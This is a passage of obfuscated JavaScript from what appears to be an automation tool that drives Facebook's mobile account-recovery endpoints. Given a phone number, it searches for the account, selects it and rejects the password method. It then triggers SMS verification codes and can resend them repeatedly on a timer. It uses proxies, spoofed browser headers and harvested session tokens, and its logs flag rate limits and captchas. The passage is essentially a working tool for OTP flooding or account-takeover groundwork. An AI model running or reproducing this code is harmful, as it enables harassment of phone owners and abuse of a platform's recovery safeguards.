        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "unknown",
        'context_data': v1013.contextData || null
      },
      'client_input_params': {
        'zero_balance_state': null,
        'search_query': v1017,
        'fetched_email_list': [],
        'fetched_email_token_list': {},
        'sso_accounts_auth_data': [],
        'sfdid': '',
        'text_input_id': "jh1wph:54",
        'encrypted_msisdn': '',
        'headers_infra_flow_id': '',
        'was_headers_prefill_available': 0x0,
        'was_headers_prefill_used': 0x0,
        'ig_oauth_token': [],
        'android_build_type': '',
        'is_whatsapp_installed': 0x0,
        'device_network_info': null,
        'accounts_list': [],
        'is_oauth_without_permission': 0x0,
        'search_screen_type': "mobile",
        'ig_vetted_device_nonce': '',
        'gms_incoming_call_retriever_eligibility': "client_not_supported",
        'auth_secure_device_id': '',
        'blocked_uids': [],
        'cloud_trust_token': null,
        'network_bssid': null,
        'lois_settings': v1019,
        'aac': ''
      }
    },
    v1021 = await mfbBloksPost("com.bloks.www.caa.ar.search.async", "action", v1020, v1013, v1014, v1015, v1016);
  if (!v1021) {
    mfbLog("SEARCH", "FAILED: no response");
    const v1029 = {};
    return v1029.ok = false, v1029.error = "no_response", v1029;
  }
  mfbLog("SEARCH", "HTTP " + v1021.status + " | " + v1021.raw.length + " bytes | rid=" + (mfbExtractRid(v1021.parsed) || "n/a")), mfbSaveRaw("SEARCH", v1021.raw);
  const v1022 = v1021.raw,
    v1023 = v1022.startsWith("for (;;);{") || v1022.startsWith("for(;;);{") || v1022.includes("\"__ar\"");
  if (!v1023) {
    const v1030 = v1022.includes("Sorry, something went wrong") || v1022.includes("<html") || v1022.includes("<!DOCTYPE");
    mfbLog("SEARCH", "FAILED: non-Bloks response (HTML error page) — " + (v1030 ? "FB server error" : "unknown format"));
    const v1031 = {};
    return v1031.ok = false, v1031.error = "search_html_error", v1031;
  }
  if (v1022.includes("search_error_dialog") && !v1022.includes("SelectAccountController") && !v1022.includes("\"cuid\"")) {
    mfbLog("SEARCH", "ACCOUNT NOT FOUND (search_error_dialog with no account context)");
    const v1032 = {};
    return v1032.ok = false, v1032.notFound = true, v1032.error = "not_found", v1032;
  }
  if (v1022.includes("No accounts match") || v1022.includes("no_account_found") || v1022.includes("ACCOUNT_NOT_FOUND")) {
    mfbLog("SEARCH", "ACCOUNT NOT FOUND");
    const v1033 = {};
    return v1033.ok = false, v1033.notFound = true, v1033.error = "not_found", v1033;
  }
  const v1024 = mfbExtractWaterfall(v1022);
  v1024 && (v1013.waterfall = v1024, mfbLog("SEARCH", "waterfall_id: " + v1013.waterfall));
  const v1025 = mfbExtractContextData(v1022);
  v1025 ? (v1013.contextData = v1025, mfbLog("SEARCH", "context_data: " + v1013.contextData.slice(0x0, 0x3c) + "...")) : mfbLog("SEARCH", "context_data: NOT FOUND");
  const v1026 = mfbExtractCuid(v1022);
  v1026 ? (v1013.cuid = v1026, mfbLog("SEARCH", "cuid (single-acct): " + v1013.cuid.slice(0x0, 0x28) + "... (len=" + v1013.cuid.length + ')')) : mfbLog("SEARCH", "cuid: NOT FOUND (likely multi-account)");
  const v1027 = v1022.includes("SelectAccountController") || !v1026 && v1022.includes("select_account");
  mfbLog("SEARCH", "multi-account: " + v1027);
  const v1028 = {};
  v1028.ok = true;
  return v1028.isMulti = v1027, v1028;
}
async function mfbSelectAccount(v1034, v1035, v1036, v1037) {
  mfbLog("SELECT_ACCT", "Fetching account list (select_account)...");
  const v1038 = {};
  v1038.lois_token = '';
  const v1039 = {};
  v1039.lois_settings = v1038, v1039.aac = '';
  const v1040 = {
      'server_params': {
        'device_id': v1034.datr || '',
        'waterfall_id': v1034.waterfall || uuid(),
        'is_platform_login': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'context_data': v1034.contextData || null,
        'back_nav_action': "BACK",
        'INTERNAL_INFRA_screen_id': "CAA_ACCOUNT_RECOVERY_SELECT_ACCOUNT"
      },
      'client_input_params': v1039
    },
    v1041 = await mfbBloksPost("com.bloks.www.caa.ar.select_account", "app", v1040, v1034, v1035, v1036, v1037);
  if (!v1041) {
    mfbLog("SELECT_ACCT", "FAILED: no response");
    const v1047 = {};
    return v1047.ok = false, v1047;
  }
  mfbLog("SELECT_ACCT", "HTTP " + v1041.status + " | " + v1041.raw.length + " bytes | rid=" + (mfbExtractRid(v1041.parsed) || "n/a")), mfbSaveRaw("SELECT_ACCOUNT", v1041.raw);
  if (v1041.status >= 0x1f4) {
    mfbLog("SELECT_ACCT", "HTTP " + v1041.status + " — aborting flow (session not established)");
    const v1048 = {};
    return v1048.ok = false, v1048.error = "select_acct_500", v1048;
  }
  const v1042 = v1041.raw,
    v1043 = v1042.includes("xhp_bk__caa__error_message_screen") || v1042.includes("error_message_screen");
  if (v1043) {
    mfbLog("SELECT_ACCT", "Error screen returned — aborting flow");
    const v1049 = {};
    return v1049.ok = false, v1049.error = "select_acct_error_screen", v1049;
  }
  const v1044 = mfbExtractContextData(v1042);
  if (v1044) v1034.contextData = v1044;
  const v1045 = mfbExtractCuid(v1042);
  v1045 ? (v1034.cuid = v1045, mfbLog("SELECT_ACCT", "cuid: " + v1034.cuid.slice(0x0, 0x32) + "... (len=" + v1034.cuid.length + ')')) : mfbLog("SELECT_ACCT", "cuid: NOT FOUND");
  const v1046 = {};
  return v1046.ok = true, v1046;
}
async function mfbSelectAccountAsync(v1050, v1051, v1052, v1053) {
  const v1054 = {};
  v1054.ok = false;
  if (!v1050.cuid) return v1054;
  mfbLog("SEL_ACCT_ASYNC", "Tapping account cuid=" + v1050.cuid.slice(0x0, 0x1e) + "...");
  const v1055 = {};
  v1055.data = [];
  const v1056 = {};
  v1056.is_eligible_for_oauth = 0x0, v1056.oauth_eligible_email = null;
  const v1057 = {};
  v1057.sso_token = null, v1057.is_eligible_for_msgr_sso = 0x0, v1057.is_eligible_for_sso = 0x0, v1057.app_source = null, v1057.login_type = "FB_SSO";
  const v1058 = {};
  v1058.is_unvetted_challenge_required = 0x1, v1058.can_bypass_timing_signal_timestamp_value = 0x0, v1058.is_unvetted_lookup_type_challenge_passed = 0x0;
  const v1059 = {};
  v1059.is_eligible_for_sowa = 0x1, v1059.is_whatsapp_installed = 0x0, v1059.unvetted_challenge_requirement = v1058;
  const v1060 = {};
  v1060.is_eligible_for_flash_call = 0x0;
  v1060.flash_call_permissions_status = null;
  v1060.sim_state = null;
  const v1061 = {};
  v1061.name = '', v1061.profile_pic_url = '', v1061.cuid = v1050.cuid, v1061.contactpoints = v1055, v1061.oauth_data = v1056, v1061.foa_sso_data = v1057, v1061.fdr_nonce = null, v1061.identifier_source = null, v1061.is_from_auto_search = 0x0, v1061.is_shared_phone_taker = 0x0, v1061.should_send_cp_nonce = 0x0, v1061.shared_phone_number = null, v1061.sowa_data = v1059, v1061.flash_call_data = v1060, v1061.assistive_id_flow = "none", v1061.joinyear = 0x7e2, v1061.lara_auth_method = null, v1061.lara_sequence_data = null, v1061.lara_decision_was_boosted = 0x0;
  const v1062 = v1061,
    v1063 = {
      'server_params': {
        'device_id': v1050.datr || '',
        'waterfall_id': v1050.waterfall || uuid(),
        'is_platform_login': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'context_data': v1050.contextData || null,
        'back_nav_action': "BACK"
      },
      'client_input_params': {
        'fb_selected_account': v1062,
        'waterfall_id': v1050.waterfall || uuid()
      }
    },
    v1064 = await mfbBloksPost("com.bloks.www.caa.ar.select_account.async", "action", v1063, v1050, v1051, v1052, v1053);
  if (!v1064) {
    mfbLog("SEL_ACCT_ASYNC", "FAILED: no response");
    const v1068 = {};
    return v1068.ok = false, v1068;
  }
  mfbLog("SEL_ACCT_ASYNC", "HTTP " + v1064.status + " | " + v1064.raw.length + " bytes | rid=" + (mfbExtractRid(v1064.parsed) || "n/a")), mfbSaveRaw("SELECT_ACCOUNT_ASYNC", v1064.raw);
  const v1065 = v1064.raw,
    v1066 = mfbExtractContextData(v1065);
  v1066 ? (v1050.contextData = v1066, mfbLog("SEL_ACCT_ASYNC", "context_data updated: " + v1050.contextData.slice(0x0, 0x3c) + "...")) : mfbLog("SEL_ACCT_ASYNC", "context_data: not updated");
  const v1067 = {};
  return v1067.ok = true, v1067;
}
async function mfbAuthMethodAsync(v1069, v1070, v1071, v1072, v1073) {
  mfbLog("AUTH_METHOD_ASYNC", "Triggering auth_method.async (rejecting password)...");
  const v1074 = String(Math.floor(Date.now() * 0x64 + Math.floor(Math.random() * 0x64))),
    v1075 = {
      'server_params': {
        'device_id': v1069.datr || '',
        'auth_method': "password",
        'is_auth_method_rejected': true,
        'auth_method_async_params': v1073,
        'context_data': v1069.contextData || null,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': v1074,
        'family_device_id': null,
        'waterfall_id': v1069.waterfall || uuid(),
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': 0x0,
        'is_from_logged_in_switcher': 0x0,
        'is_from_logged_out': 0x0,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery"
      },
      'client_input_params': {
        'zero_balance_state': '',
        'android_build_type': '',
        'cloud_trust_token': null,
        'network_bssid': null,
        'lois_settings': {
          'lois_token': v1069.loisToken || ''
        },
        'aac': ''
      }
    };
  const v1076 = await mfbBloksPost("com.bloks.www.caa.ar.auth_method.async", "action", v1075, v1069, v1070, v1071, v1072);
  if (!v1076) {
    mfbLog("AUTH_METHOD_ASYNC", "No response (non-fatal, continuing with existing context_data)");
    const v1079 = {};
    return v1079.ok = false, v1079;
  }
  mfbLog("AUTH_METHOD_ASYNC", "HTTP " + v1076.status + " | " + v1076.raw.length + " bytes | rid=" + (mfbExtractRid(v1076.parsed) || "n/a")), mfbSaveRaw("AUTH_METHOD_ASYNC", v1076.raw);
  const v1077 = mfbExtractContextData(v1076.raw);
  v1077 ? (v1069.contextData = v1077, mfbLog("AUTH_METHOD_ASYNC", "context_data updated from async: " + v1069.contextData.slice(0x0, 0x3c) + "...")) : mfbLog("AUTH_METHOD_ASYNC", "context_data retained: " + (v1069.contextData ? v1069.contextData.slice(0x0, 0x3c) + "..." : "none"));
  const v1078 = {};
  return v1078.ok = true, v1078;
}
async function mfbAuthMethod(v1080, v1081, v1082, v1083) {
  mfbLog("AUTH_METHOD", "Fetching auth_method screen...");
  const v1084 = {};
  v1084.lois_token = '';
  const v1085 = {};
  v1085.aac = '';
  v1085.lois_settings = v1084, v1085.zero_balance_state = '';
  const v1086 = {
    'server_params': {
      'INTERNAL_INFRA_screen_id': "jhjrew:3",
      'access_flow_version': "pre_mt_behavior",
      'back_nav_action': "BACK",
      'context_data': v1080.contextData || null,
      'device_id': v1080.datr || '',
      'is_from_logged_out': 0x0,
      'is_platform_login': 0x0,
      'login_entry_point': "account_recovery",
      'login_surface': "account_recovery",
      'waterfall_id': v1080.waterfall || uuid()
    },
    'client_input_params': v1085
  };
  const v1087 = await mfbBloksPost("com.bloks.www.caa.ar.auth_method", "app", v1086, v1080, v1081, v1082, v1083);
  if (!v1087) {
    mfbLog("AUTH_METHOD", "FAILED: no response");
    const v1091 = {};
    return v1091.ok = false, v1091;
  }
  mfbLog("AUTH_METHOD", "HTTP " + v1087.status + " | " + v1087.raw.length + " bytes | rid=" + (mfbExtractRid(v1087.parsed) || "n/a")), mfbSaveRaw("AUTH_METHOD", v1087.raw);
  const v1088 = v1087.raw,
    v1089 = mfbExtractAuthMethodRecoveryData(v1088);
  if (v1089 && v1089.contextData) v1080.contextData = v1089.contextData, mfbLog("AUTH_METHOD", "recovery context_data updated: " + v1080.contextData.slice(0x0, 0x3c) + "...");else {
    const v1092 = mfbExtractContextData(v1088);
    v1092 ? (v1080.contextData = v1092, mfbLog("AUTH_METHOD", "fallback context_data updated: " + v1080.contextData.slice(0x0, 0x3c) + "...")) : mfbLog("AUTH_METHOD", "context_data: not updated");
  }
  v1089 && v1089.asyncParams && (await mfbAuthMethodAsync(v1080, v1081, v1082, v1083, v1089.asyncParams));
  const v1090 = {};
  return v1090.ok = true, v1090;
}
async function mfbInitiateView(v1093, v1094, v1095, v1096) {
  mfbLog("INITIATE", "Sending initiate_view...");
  const v1097 = {};
  v1097.lois_token = '';
  const v1098 = {};
  v1098.aac = '', v1098.lois_settings = v1097, v1098.machine_id = '', v1098.zero_balance_state = '';
  const v1099 = {
      'server_params': {
        'INTERNAL_INFRA_screen_id': "jhvd2d:2",
        'access_flow_version': "pre_mt_behavior",
        'back_nav_action': "BACK",
        'context_data': v1093.contextData || null,
        'device_id': v1093.datr || '',
        'is_from_logged_out': 0x0,
        'is_platform_login': 0x0,
        'login_entry_point': "account_recovery",
        'login_surface': "account_recovery",
        'waterfall_id': v1093.waterfall || uuid()
      },
      'client_input_params': v1098
    },
    v1100 = await mfbBloksPost("com.bloks.www.caa.ar.initiate_view", "app", v1099, v1093, v1094, v1095, v1096);
  if (!v1100) {
    mfbLog("INITIATE", "FAILED: no response");
    const v1108 = {};
    return v1108.ok = false, v1108;
  }
  mfbLog("INITIATE", "HTTP " + v1100.status + " | " + v1100.raw.length + " bytes | rid=" + (mfbExtractRid(v1100.parsed) || "n/a")), mfbSaveRaw("INITIATE_VIEW", v1100.raw);
  const v1101 = v1100.raw,
    v1102 = mfbExtractAuthOptionContextData(v1101, "phone");
  if (v1102) v1093.phoneContextData = v1102, v1093.contextData = v1102, mfbLog("INITIATE", "phone context_data extracted: " + v1102.slice(0x0, 0x32) + "...");else {
    const v1109 = mfbExtractContextData(v1101);
    if (v1109) v1093.contextData = v1109;
    mfbLog("INITIATE", "fallback context_data: " + (v1093.contextData ? v1093.contextData.slice(0x0, 0x32) + "..." : "none"));
  }
  const v1103 = mfbExtractSerializedStates(v1101);
  v1103 ? (v1093.serializedStatesObj = v1103, mfbLog("INITIATE", "serialized_states: extracted (" + JSON.stringify(v1103) + ')')) : mfbLog("INITIATE", "serialized_states: not found (using fallback)");
  const v1104 = mfbExtractAuthOptions(v1101);
  v1104 !== null && v1104.length > 0x0 ? (v1093.authOptions = v1104, mfbLog("INITIATE", "auth_options extracted: " + JSON.stringify(v1104))) : (v1093.authOptions = ["whatsapp", "phone", "password"], mfbLog("INITIATE", "auth_options using default fallback: " + JSON.stringify(v1093.authOptions)));
  const v1105 = v1101.includes("SmsCaptcha") || v1101.includes("sms_captcha");
  const v1106 = (v1101.includes("generic_error_dialog_shown") || v1101.includes("Your session expired") || v1101.includes("ar_context_exception")) && !v1102;
  mfbLog("INITIATE", "captcha=" + v1105 + " ar_context_err=" + v1106);
  if (v1106) {
    mfbLog("INITIATE", "FAIL: InitiateView returned session error / ar_context_exception");
    const v1110 = {};
    return v1110.ok = false, v1110.error = "ar_context_exception", v1110;
  }
  const v1107 = {};
  return v1107.ok = true, v1107.hasCaptcha = v1105, v1107;
}
async function mfbSendOTP(v1111, v1112, v1113, v1114) {
  mfbLog("OTP_SEND", "Triggering auth_option_selection (auth_option=phone)...");
  const v1115 = {};
  v1115.is_loading = "2;loading;0";
  const v1116 = v1111.serializedStatesObj || v1115,
    v1117 = v1111.phoneContextData || v1111.contextData || null,
    v1118 = String(Math.floor(Date.now() * 0x64 + Math.floor(Math.random() * 0x64))),
    v1119 = v1111.authOptions && v1111.authOptions.length > 0x0 ? v1111.authOptions : ["whatsapp", "phone", "password"],
    v1120 = {
      'server_params': {
        'device_id': v1111.datr || '',
        'event_request_id': uuid(),
        'login_type': "FB_SSO",
        'fdr_nonce': '',
        'auth_options': v1119,
        'is_feta_auth_option': true,
        'lara_usage': false,
        'INTERNAL__latency_qpl_marker_id': 0x2301b43,
        'INTERNAL__latency_qpl_instance_id': v1118,
        'family_device_id': null,
        'waterfall_id': v1111.waterfall || uuid(),
        'offline_experiment_group': null,
        'layered_homepage_experiment_group': null,
        'is_platform_login': false,
        'is_from_logged_in_switcher': false,
        'is_from_logged_out': false,
        'access_flow_version': "pre_mt_behavior",
        'login_surface': "account_recovery",
        'login_entry_point': "account_recovery",
        'context_data': v1117,
        'serialized_states': v1116
      },
      'client_input_params': {
        'family_device_id': '',
        'machine_id': '',
        'zero_balance_state': '',
        'auth_option': "phone",
        'android_build_type': '',
        'selected_phone_number_index': -1,
        'selected_xapp_contactpoint_index': 0x0,
        'selected_encrypted_bloks_xapp_cp_lookup_data': '',
        'cloud_trust_token': null,
        'network_bssid': null,
        'lois_settings': {
          'lois_token': v1111.loisToken || ''
        },
        'aac': ''
      }
    },
    v1121 = await mfbBloksPost("com.bloks.www.caa.ar.auth_option_selection.async", "action", v1120, v1111, v1112, v1113, v1114);
  if (!v1121) {
    mfbLog("OTP_SEND", "FAILED: no response");
    const v1133 = {};
    return v1133.ok = false, v1133.error = "no_response", v1133;
  }
  mfbLog("OTP_SEND", "HTTP " + v1121.status + " | " + v1121.raw.length + " bytes | rid=" + (mfbExtractRid(v1121.parsed) || "n/a")), mfbSaveRaw("OTP_SEND", v1121.raw);
  const v1122 = v1121.raw,
    v1123 = (v1122 || '').toLowerCase(),
    v1124 = v1123.includes("code_entry") || v1123.includes("initiate_view_code_send_success") || v1122.includes("push_screen_BloksCAAAccountRecoveryCodeEntryController") || v1122.includes("CAA_NOTIF_DELIVERY_STATUS") || v1123.includes("caa_account_recovery_code_entry") || v1123.includes("inserisci il codice") || v1123.includes("enter the code") || v1123.includes("6-digit code"),
    v1125 = v1123.includes("smscaptcha") || v1123.includes("sms_captcha");
  let v1126 = null,
    v1127 = null;
  const v1128 = v1122.match(/"title"\s*,\s*"((?:\\.|[^"\\])*)"\s*,\s*"message"\s*,\s*"((?:\\.|[^"\\])*)"/);
  if (v1128) try {
    v1126 = JSON.parse('\x22' + v1128[0x1] + '\x22'), v1127 = JSON.parse('\x22' + v1128[0x2] + '\x22');
  } catch (v1134) {
    v1126 = v1128[0x1], v1127 = v1128[0x2];
  }
  const v1129 = v1123.includes("generic_error_dialog_shown") || v1123.includes("initiate_view_failure_client") || v1122.includes("bk.action.dialog.OpenDialog") || v1123.includes("verificato un errore") || v1123.includes("something went wrong") || v1123.includes("an error occurred");
  const v1130 = v1123.includes("ar_context_exception") || v1122.includes("xhp_bk__caa__error_message_screen") || v1123.includes("error_message_screen") || v1123.includes("identifier_error_dialog"),
    v1131 = v1130 || v1129;
  mfbLog("OTP_SEND", "code_entry=" + v1124 + "  SmsCaptcha=" + v1125 + "  error=" + v1131);
  (v1126 || v1127) && mfbLog("OTP_SEND", "FB Dialog: \"" + (v1126 || '') + "\" — \"" + (v1127 || '') + '\x22');
  if (v1124) {
    mfbLog("OTP_SEND", "SUCCESS: OTP sent (code_entry confirmed)");
    const v1135 = {};
    return v1135.ok = true, v1135.hasCaptcha = false, v1135;
  }
  if (v1125) {
    mfbLog("OTP_SEND", "SUCCESS: OTP triggered (SmsCaptcha challenge shown)");
    const v1136 = {};
    return v1136.ok = true, v1136.hasCaptcha = true, v1136;
  }
  if (v1126 || v1129) {
    mfbLog("OTP_SEND", "FAIL: FB returned error dialog: \"" + (v1126 || "generic_error") + "\" (\"" + (v1127 || '') + '\x22)');
    const v1137 = {};
    return v1137.ok = false, v1137.error = v1126 ? "fb_dialog: " + v1126 : "generic_error_dialog", v1137.dialogTitle = v1126, v1137.dialogMessage = v1127, v1137;
  }
  mfbLog("OTP_SEND", "FAIL: FB did not return code_entry or SmsCaptcha (silent reject / rate limit)");
  const v1132 = {};
  return v1132.ok = false, v1132.error = v1130 ? "ar_context_exception" : "otp_not_dispatched", v1132;
}
async function processNumberMobile(v1138, v1139, v1140, v1141, v1142 = 0x0) {
  const v1143 = v1138.startsWith('+') ? v1138 : '+' + v1138;
  mfbLog("FLOW", "Starting m.facebook.com Bloks OTP for " + v1143);
  try {
    const v1144 = await mfbBootstrap(v1139, v1140, v1141);
    if (!v1144.fb_dtsg && !v1144.lsd) {
      mfbLog("FLOW", "ABORT: Bootstrap returned no tokens");
      const v1149 = {};
      return v1149.ok = false, v1149.error = "bootstrap_fail", v1149;
    }
    const v1145 = await mfbSearch(v1143, v1144, v1139, v1140, v1141);
    if (!v1145.ok) {
      mfbLog("FLOW", "ABORT: Search failed");
      const v1150 = {};
      return v1150.ok = false, v1150.error = v1145.error || (v1145.notFound ? "not_found" : "search_fail"), v1150;
    }
    if (!v1144.cuid) {
      mfbLog("FLOW", "No cuid — entering select_account (multi-account path)");
      const v1151 = await mfbSelectAccount(v1144, v1139, v1140, v1141);
      if (!v1151.ok) {
        mfbLog("FLOW", "ABORT: select_account failed (" + (v1151.error || "unknown") + ')');
        const v1152 = {};
        return v1152.ok = false, v1152.error = v1151.error || "select_acct_fail", v1152;
      }
      v1144.cuid ? await mfbSelectAccountAsync(v1144, v1139, v1140, v1141) : mfbLog("FLOW", "No cuid found after select_account — continuing without");
    }
    await mfbAuthMethod(v1144, v1139, v1140, v1141);
    const v1146 = await mfbInitiateView(v1144, v1139, v1140, v1141);
    if (!v1146.ok) {
      mfbLog("FLOW", "ABORT: InitiateView failed");
      const v1153 = {};
      return v1153.ok = false, v1153.error = "initiate_fail", v1153;
    }
    const v1147 = await mfbSendOTP(v1144, v1139, v1140, v1141);
    if (!v1147.ok) {
      mfbLog("FLOW", "ABORT: SendOTP failed: " + v1147.error);
      const v1154 = {};
      return v1154.ok = false, v1154.error = v1147.error || "otp_send_fail", v1154;
    }
    for (let v1155 = 0x0; v1155 < v1142; v1155++) {
      await sleep(0x1388), await mfbSendOTP(v1144, v1139, v1140, v1141);
    }
    mfbLog("SESSION", "cuid        : " + (v1144.cuid ? v1144.cuid.slice(0x0, 0x28) + "..." : "(none)")), mfbLog("SESSION", "contextData : " + (v1144.contextData ? v1144.contextData.slice(0x0, 0x28) + "..." : "(none)")), mfbLog("SESSION", "waterfall   : " + (v1144.waterfall || "(none)")), mfbLog("SESSION", "datr        : " + (v1144.datr ? v1144.datr.slice(0x0, 0x14) + "..." : "(none)")), mfbLog("SESSION", "fb_dtsg     : " + (v1144.fb_dtsg ? v1144.fb_dtsg.slice(0x0, 0x14) + "..." : "(none)")), mfbLog("FLOW", "SUCCESS " + v1143 + (v1147.hasCaptcha ? " (SmsCaptcha)" : ''));
    const v1148 = {};
    return v1148.ok = true, v1148.hasCaptcha = v1147.hasCaptcha, v1148;
  } catch (v1156) {
    mfbLog("FLOW", "EXCEPTION: " + (v1156.stack || v1156.message));
    const v1157 = {};
    return v1157.ok = false, v1157.error = v1156.message, v1157;
  }
}
async function httpsGetPageWithRedirects(v1158, v1159, v1160 = 0x3a98, v1161 = "www.facebook.com", v1162 = null, v1163 = null, v1164 = null, v1165 = 0x5) {
  let v1166 = v1161 || "www.facebook.com",
    v1167 = v1158.startsWith("http") ? (() => {
      try {
        const v1173 = new URL(v1158);
        return v1166 = "www.facebook.com", v1173.pathname + v1173.search;
      } catch (v1174) {
        return v1158;
      }
    })() : v1158,
    v1168 = v1164 || "https://" + v1166 + "/login/identify/";
  const v1169 = {};
  (v1159 || '').split(';').forEach(v1175 => {
    const v1176 = v1175.indexOf('=');
    if (v1176 < 0x0) return;
    v1169[v1175.slice(0x0, v1176).trim()] = v1175.slice(v1176 + 0x1).trim();
  });
  let v1170 = null;
  for (let v1177 = 0x0; v1177 < v1165; v1177++) {
    const v1178 = Object.entries(v1169).map(([v1183, v1184]) => v1183 + '=' + v1184).join(';\x20'),
      v1179 = v1163 || globalUA,
      v1180 = {
        'Cookie': v1178,
        'User-Agent': v1179.userAgent,
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'Accept-Language': v1163 && v1163.hostCtx ? v1163.hostCtx.lang : "en-US,en;q=0.9",
        'Accept-Encoding': "gzip, deflate, br",
        'Referer': v1168,
        'Upgrade-Insecure-Requests': '1',
        ...v1179.clientHints
      };
    v1180["sec-fetch-dest"] = "document", v1180["sec-fetch-mode"] = "navigate", v1180["sec-fetch-site"] = "same-origin", v1180["sec-fetch-user"] = '?1';
    const v1181 = v1180;
    if (v1162) {
      const v1185 = {};
      v1185.hostname = v1166, v1185.path = v1167, v1185.method = "GET", v1185.headers = v1181, v1170 = await proxyHttpsRequest(v1162, v1185, null, v1160);
    } else v1170 = await new Promise((v1186, v1187) => {
      const v1188 = {};
      v1188.hostname = v1166, v1188.port = 0x1bb, v1188.path = v1167, v1188.method = "GET", v1188.timeout = v1160, v1188.headers = v1181;
      const v1189 = v1188,
        v1190 = https.request(v1189, v1191 => {
          const v1192 = [];
          v1191.on("data", v1193 => v1192.push(v1193));
          v1191.on("end", () => {
            let v1194 = Buffer.concat(v1192);
            try {
              const v1195 = v1191.headers["content-encoding"];
              if (v1195 === "gzip") v1194 = zlib.gunzipSync(v1194);else {
                if (v1195 === "deflate") v1194 = zlib.inflateSync(v1194);else {
                  if (v1195 === 'br') v1194 = zlib.brotliDecompressSync(v1194);
                }
              }
            } catch (v1196) {}
            v1186({
              'status': v1191.statusCode,
              'headers': v1191.headers,
              'data': v1194.toString(),
              'location': v1191.headers.location || ''
            });
          });
          v1191.on("error", v1187);
        });
      v1190.on("error", v1187);
      v1190.on("timeout", () => {
        v1190.destroy(), v1187(new Error("GET timeout"));
      });
      v1190.end();
    });
    const v1182 = v1170.headers && v1170.headers["set-cookie"];
    v1182 && (Array.isArray(v1182) ? v1182 : [v1182]).forEach(v1197 => {
      const v1198 = v1197.split(';')[0x0].split('=');
      if (v1198.length >= 0x2) {
        const v1199 = v1198[0x0].trim(),
          v1200 = v1198.slice(0x1).join('=').trim();
        if (v1200 !== "deleted" && !v1200.startsWith("deleted;")) v1169[v1199] = v1200;
      }
    });
    if ((v1170.status === 0x12d || v1170.status === 0x12e || v1170.status === 0x133) && v1170.location) {
      v1168 = "https://" + v1166 + v1167;
      let v1201 = v1170.location;
      if (v1201.startsWith("http")) try {
        const v1202 = new URL(v1201);
        v1166 = "www.facebook.com", v1167 = v1202.pathname + v1202.search;
      } catch (v1203) {
        v1167 = v1201;
      } else v1167 = v1201;
      cdbg("[GET REDIRECT] HTTP " + v1170.status + " -> " + v1166 + v1167.slice(0x0, 0x3c));
    } else break;
  }
  const v1171 = Object.entries(v1169).map(([v1204, v1205]) => v1204 + '=' + v1205).join(';\x20'),
    v1172 = {};
  v1172.status = v1170.status, v1172.headers = v1170.headers, v1172.data = v1170.data, v1172.cookieHeader = v1171, v1172.cookieMap = v1169;
  return v1172;
}
function parseResp(v1206) {
  v1206 = String(v1206).replace(/^for \(;;\);/, '');
  try {
    return JSON.parse(v1206);
  } catch (v1207) {
    return null;
  }
}
function mergeCookies(v1208, v1209) {
  if (!v1209) return;
  const v1210 = v1209["set-cookie"];
  if (!v1210) return;
  const v1211 = Array.isArray(v1210) ? v1210 : [v1210],
    v1212 = {};
  (v1208.cookieHeader || '').split(';').forEach(v1213 => {
    const v1214 = v1213.indexOf('=');
    if (v1214 < 0x0) return;
    v1212[v1213.slice(0x0, v1214).trim()] = v1213.slice(v1214 + 0x1).trim();
  });
  v1211.forEach(v1215 => {
    const v1216 = v1215.split(';')[0x0].split('=');
    if (v1216.length >= 0x2) v1212[v1216[0x0].trim()] = v1216.slice(0x1).join('=').trim();
  });
  v1208.cookieHeader = Object.entries(v1212).map(([v1217, v1218]) => v1217 + '=' + v1218).join(';\x20'), dbg("[COOKIE MERGE] sfiu=" + (v1212.sfiu ? '✓' : '✗') + " keys=" + Object.keys(v1212).join(','));
}
async function searchAccount(v1219, v1220, v1221, v1222, v1223, v1224, v1225, v1226 = false) {
  const v1227 = uuid(),
    v1228 = uuid();
  if (SELECTED_BROWSER === "via_browser" && !v1226) {
    dbg("[SEARCH] Via Browser Mode: Executing m.facebook.com Bloks CAA Search for " + v1219);
    let v1242 = v1220.contextData || '';
    const fn22 = async (v1263, v1264, v1265, v1266 = {}) => {
      const v1267 = "/async/wbloks/fetch/?appid=" + v1263 + "&type=" + v1264 + "&__bkv=" + "8d7a099705c6918973f9eb638946ec70f8b902374eed3558006659bdf45d268b",
        v1268 = {};
      v1268.server_params = v1265, v1268.client_input_params = v1266;
      const v1269 = JSON.stringify({
          'params': JSON.stringify(v1268)
        }),
        v1270 = new URLSearchParams();
      v1270.set("__aaid", '0');
      v1270.set("__user", '0'), v1270.set("__a", '1');
      if (!v1220.__req) v1220.__req = 0xa;
      v1270.set("__req", (v1220.__req++).toString(0x10)), v1270.set("__hs", v1220.__hs || "20687.BP:wbloks_caa_pkg.2.0...0");
      v1270.set("dpr", '3'), v1270.set("__ccg", "EXCELLENT"), v1270.set("__rev", v1220.rev || "1045798079"), v1270.set("__s", v1220.__s || ''), v1270.set("__hsi", v1220.hsi || String(Date.now())), v1270.set("__dyn", v1220.__dyn || ''), v1270.set("fb_dtsg", v1220.fb_dtsg || '');
      let v1271 = "24976";
      if (v1220.fb_dtsg) {
        let v1273 = 0x0;
        for (let v1274 = 0x0; v1274 < v1220.fb_dtsg.length; v1274++) v1273 += v1220.fb_dtsg.charCodeAt(v1274);
        v1271 = '2' + v1273;
      }
      v1270.set("jazoest", v1220.jazoest || v1271), v1270.set("lsd", v1220.lsd || ''), v1270.set("params", v1269), dbg("[BLOKS CALL] " + v1263 + '\x20(' + v1264 + ')');
      const v1272 = await bloksPostPage(v1267, v1270.toString(), v1220.cookieHeader, 0x3a98, "m.facebook.com", v1221, v1222, "https://m.facebook.com/login/identify/");
      if (v1272.headers) mergeCookies(v1220, v1272.headers);
      return v1272;
    };
    if (!v1242) {
      dbg("[BLOKS INIT] Fetching initial context_data via initiate_view...");
      const v1275 = {};
